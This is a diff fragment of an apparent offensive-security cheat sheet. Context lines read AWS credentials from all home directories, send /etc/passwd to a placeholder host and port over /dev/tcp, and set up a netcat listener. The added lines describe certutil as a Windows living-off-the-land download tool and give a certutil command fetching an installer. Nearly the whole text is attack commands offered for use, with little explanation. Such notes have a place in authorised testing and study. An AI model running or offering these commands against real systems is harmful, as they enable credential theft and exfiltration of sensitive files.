@@ -15,3 +15,8 @@ cat /home/*/.aws/credentials
 --# EXFIL DATA #--
 cat /etc/passwd > dev/tcp/<ipaddr>/<port> #send contents of passwd file to system listening on <port>
 #nc -l -p <port> < file
+
+#Certutil# 
+certutil can be used on Windows as a way to download files
+LOLBAS has an example of this;
+certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
